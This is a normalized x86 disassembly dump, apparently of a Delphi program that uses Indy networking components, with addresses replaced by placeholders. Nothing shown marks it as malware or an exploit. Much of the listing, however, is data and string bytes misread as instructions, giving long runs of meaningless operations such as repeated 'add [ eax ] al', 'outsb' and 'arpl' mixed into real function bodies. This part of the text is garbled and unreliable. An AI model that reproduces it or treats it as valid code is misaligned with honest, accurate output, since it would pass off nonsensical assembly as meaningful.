retn
mov ebp ebx
mov ebx [ esp ]
cmp [ esp + 0x4 ] 0x0
jbe r-xdata
mov al [ ebp ]
mov [ esp + 0x8 ] al
inc ebp
dec edi
sub esi edi
test esi esi
jg r-xdata
add ebx [ esp + 0x4 ]
dec ebx
inc esi
sub esi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp al [ esp + 0x8 ]
jne r-xdata
inc ebx
inc ebx
mov ecx edi
mov edx ebp
mov eax ebx
call sub_408110
test al al
je r-xdata
dec esi
test esi esi
jg r-xdata
mov eax ebx
sub eax [ esp ]
jmp r-xdata
sub_46e434
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e4e7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e4ee
retn
mov eax rw-data
call sub_40d490
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
call sub_404164
mov eax rw-data
mov edx [ r-xdata ]
call sub_40544c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40544c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404c00
sub_46e4f0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_46e5c3
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e5ca
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea eax [ ebp - 0x4 ]
call sub_46de1c
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_4041b8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402ea0
jne r-xdata
mov eax sub_40c814
mov [ rw-data ] eax
mov [ rw-data ] sub_46e308
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405440
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4041b8
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405440
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4041b8
sub_46e75a
inc ecx
add ah bh
adc al 0x42
add [ esi + ecx * 4 + 0x15d40041 ] dh
inc edx
add [ eax - 0x1bffbdec ] ah
adc eax 0x16dc0042
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ eax + ebp * 8 + 0x46 ] dh
add [ ebx + ebp + 0x40 ] cl
add [ ecx ] dl
push esp
dec ecx
inc ecx
outsb
je r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
sub eax 0x8bfff94e
fimul [ ebx + 0x55c033f0 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e90a
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
push sub_46e903
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_421184
test [ esi + 0x1c ] 0x10
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
movsb [ edi ] [ esi ]
out 0x46 eax
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
push ebp
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
je r-xdata
sub bl bh
push esi
inc esi
sbb al 0x10
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
xor al 0x0
call sub_4036b4
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
pop eax
out 0x46 eax
add [ eax + 0x60046e6 ] ah
add [ eax ] dl
dec ecx
inc ecx
outsb
je r-xdata
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
inc [ ecx ]
inc esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
inc edx
popad
jae r-xdata
add [ eax ] al
cmp dl 0x0
add [ eax ] al
add al 0x0
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] dh
add [ eax ] al
sub_46e928
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4211d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_46e954
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_46e998
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_46e998
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_46e2ec
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_46e9c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e9e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e9ec
retn
sub_46eaed
inc eax
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
push edi
outsd
jb r-xdata
inc ecx
push edi
outsd
jb r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al dh
0x77060046 0x526d
imul eax [ ebp + 0x76 ] 0x65
outsb
je r-xdata
inc ebx
outsd
jne r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
add [ ecx ] cl
inc ecx
push edi
outsd
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x9 ] si
dec ebp
outsd
add [ gs : ecx + edx ] al
inc eax
add al dh
0xd0900046 0x46eb
popad
js r-xdata
mov al [ 0x4035 ]
dec ebp
outsd
or [ gs : edi + edx * 2 + 0x6f ] edx
jb r-xdata
add [ ecx + edx ] al
dec ecx
outsb
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_421184
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
outsb
outsb
je r-xdata
inc eax
add [ ebp + ebp * 8 - 0x7067ffba ] ah
inc ecx
add ah bh
dec ebp
outsd
add cl [ gs : edx ]
inc ecx
push edi
outsd
jb r-xdata
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov eax [ r-xdata ]
call sub_46c35c
mov edx [ rw-data ]
mov [ edx ] eax
xor eax [ eax ]
sbb al 0x33
add [ eax ] ch
add [ eax ] al
adc dh ah
inc esi
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
inc eax
add al al
in al dx
inc esi
add [ edi ] al
or al 0x54
dec ecx
inc ebx
outsd
insd
jo r-xdata
adc al 0x42
add [ esi + ecx * 4 + 0x15d40041 ] dh
inc ebx
outsd
jne r-xdata
inc eax
add al dh
0x103c0046 0x40
add al 0x11
push ebp
push sub_46ed7e
outsb
outsb
je r-xdata
inc edx
add [ eax - 0x1bffbdec ] ah
adc eax 0x16dc0042
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
aam 0x15
je r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
in al dx
inc esi
add [ eax + 0x30046e6 ] ah
add [ ebx ] cl
dec ecx
inc ebx
outsd
insd
jo r-xdata
add [ ecx + edx ] al
dec ecx
outsb
je r-xdata
jne r-xdata
dec eax
add [ ecx ] al
outsb
outsb
je r-xdata
mov es [ ecx ]
jb r-xdata
xchg esp eax
0x300046 0xff00
add [ edx + ebp * 8 + 0x300046 ] dl
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ edi + 0x6e ] cl
push ebx
je r-xdata
inc eax
add al dh
0x103c0046 0x40
add al 0x11
mov [ fs : eax ] edx
push sub_46ed85
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
rcr [ edx + 0x59 ] 0x59
je r-xdata
retn
jae r-xdata
add [ ecx + ebx ] dl
inc edx
add [ ebp * 8 - 0x1113ffba ] cl
inc esi
add [ edi + ebp * 8 ] ah
inc esi
add [ edi + ebp * 8 + 0x46 ] dl
add [ esp + edx * 2 ] cl
dec ecx
inc ebx
outsd
insd
jo r-xdata
inc eax
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
add esp 0xfffffff0
call sub_4036b4
sub_46ec26
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
in al dx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0x680046 ] ch
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_421184
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
outsb
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov eax [ r-xdata ]
call sub_46c35c
mov edx [ rw-data ]
mov [ edx ] eax
add [ eax ] al
adc dh ah
inc esi
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ebp + ebp * 8 - 0x7067ffba ] ah
inc ecx
add ah bh
adc al 0x42
add [ esi + ecx * 4 + 0x15d40041 ] dh
inc edx
add [ eax - 0x1bffbdec ] ah
adc eax 0x16dc0042
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ eax ] ch
inc eax
add al al
in al dx
inc esi
add [ edi ] al
or al 0x54
dec ecx
inc ebx
outsd
insd
jo r-xdata
push ebp
push sub_46ed7e
outsb
outsb
je r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
in al dx
inc esi
add [ eax + 0x30046e6 ] ah
add [ ebx ] cl
dec ecx
inc ebx
outsd
insd
jo r-xdata
jne r-xdata
dec eax
add [ ecx ] al
outsb
outsb
je r-xdata
xchg esp eax
0x300046 0xff00
add [ edx + ebp * 8 + 0x300046 ] dl
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ edi + 0x6e ] cl
push ebx
je r-xdata
mov [ fs : eax ] edx
push sub_46ed85
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
rcr [ edx + 0x59 ] 0x59
je r-xdata
retn
jae r-xdata
add [ ecx + ebx ] dl
inc edx
add [ ebp * 8 - 0x1113ffba ] cl
inc esi
add [ edi + ebp * 8 ] ah
inc esi
add [ edi + ebp * 8 + 0x46 ] dl
add [ esp + edx * 2 ] cl
dec ecx
inc ebx
outsd
insd
jo r-xdata
inc eax
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
add esp 0xfffffff0
call sub_4036b4
sub_46ed0c
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_421184
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46ed7e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_4036b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ed85
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_46c35c
mov edx [ rw-data ]
mov [ edx ] eax
sub_46eda4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40371c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4211d0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46ee0b
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ee12
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d490
sub_46ee30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46eedb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eee2
lea eax [ ebp - 0x10 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_409098
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_409098
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_46eeec
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_46ef24
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_46ef54
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_46ef84
or [ eax ] eax
add [ eax ] al
pop esp
xor eax 0x37d80048
dec eax
add [ eax + 0x35 ] bl
dec eax
add al bl
aaa
dec eax
add [ ebp + esi + 0x48 ] dl
add al bl
aaa
dec eax
add [ eax + 0x35 ] dl
dec eax
add al bl
aaa
dec eax
add [ ebp + esi + 0x48 ] cl
add [ eax + edi + 0x48 ] al
add [ eax + 0x35 ] cl
dec eax
add [ edx + edi + 0x48 ] bl
add [ ebp + esi + 0x48 ] al
add [ eax + 0x36 ] ah
dec eax
add [ eax + 0x35 ] al
dec eax
add ah dl
cmp [ eax ] cl
cmp al 0x35
dec eax
add al dh
dec eax
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46f00c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f013
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404c00
sub_46f11d
int1
inc esi
add [ eax + eax ] ch
add [ eax ] al
jl r-xdata
inc eax
add [ eax ] bl
add [ eax ] al
add [ edi ] cl
push esp
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0xb ] bl
inc esi
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
cmp dl 0x46
add [ eax - 0x6fffbe6e ] dh
xchg ebx eax
inc ecx
add al al
xchg ebx eax
inc ecx
add [ eax - 0x1bffbe6d ] bh
clc
inc esi
add ah ch
hlt
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
insb
mov eax eax
movsb [ edi ] [ esi ]
int1
inc esi
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] ch
popad
outsb
insb
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xf3
test al 0xf2
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046f2 ] ch
add [ eax ] al
add [ edi + ebx * 4 + 0x46 ] ah
add [ eax ] al
[ eax ]
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ 0x65696c43 ] cl
outsb
je r-xdata
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax 0x35ac0040
inc eax
add [ eax + 0x4035 ] ah
insb
insb
inc edx
jns r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x61506449 ] dl
arpl [ ebx + 0x61 ] bp
add [ eax + 0x4035 ] ah
popad
outsb
insb
inc ebp
jb r-xdata
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xf2
inc esi
add [ eax + eax ] cl
add [ eax ] al
lahf
inc esi
outsd
jb r-xdata
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 8 ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop esp
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xd ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop esp
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] dl
inc ebp
outsd
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x6f536449 ] dl
arpl [ ebx + 0x65 ] bp
je r-xdata
xor eax 0x35ac0040
inc eax
add [ eax + 0x4035 ] ah
dec ebp
popad
js r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
inc ebx
push es
add [ eax ] al
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
pushfd
hlt
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x74726f50
outsd
jne r-xdata
inc ebx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop esp
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
inc eax
add [ ebx + esi * 8 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 ] cl
int1
inc esi
add [ eax ] cl
arpl [ ecx ] ax
add al 0x0
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
dec eax
add bh bh
add [ eax ] eax
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
dec ecx
dec esi
outsd
je r-xdata
shl [ esp + esi * 8 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
push ebx
imul edi [ edx + 0x65 ] 0x426f6f54
imul esp [ edi - 0x73 ] 0xf3700040
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x43644945 ] dl
shl bl 0x1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop esp
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_46c270
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_46fb14
sub_46f201
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or eax 0x65696c43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xf2
inc esi
add [ eax + eax ] cl
add [ eax ] al
lahf
inc esi
outsd
jb r-xdata
add [ eax + 0x4035 ] ah
popad
outsb
insb
inc ebp
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x6f536449 ] dl
arpl [ ebx + 0x65 ] bp
je r-xdata
xor eax 0x35ac0040
inc eax
add [ eax + 0x4035 ] ah
dec ebp
popad
js r-xdata
xor eax 0x35ac0040
inc eax
add [ eax + 0x4035 ] ah
insb
insb
inc edx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xd ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop esp
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] dl
inc ebp
outsd
jb r-xdata
dec eax
int1
inc esi
add [ eax ] cl
arpl [ ecx ] ax
add al 0x0
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 8 ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop esp
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
jae r-xdata
add [ eax ] al
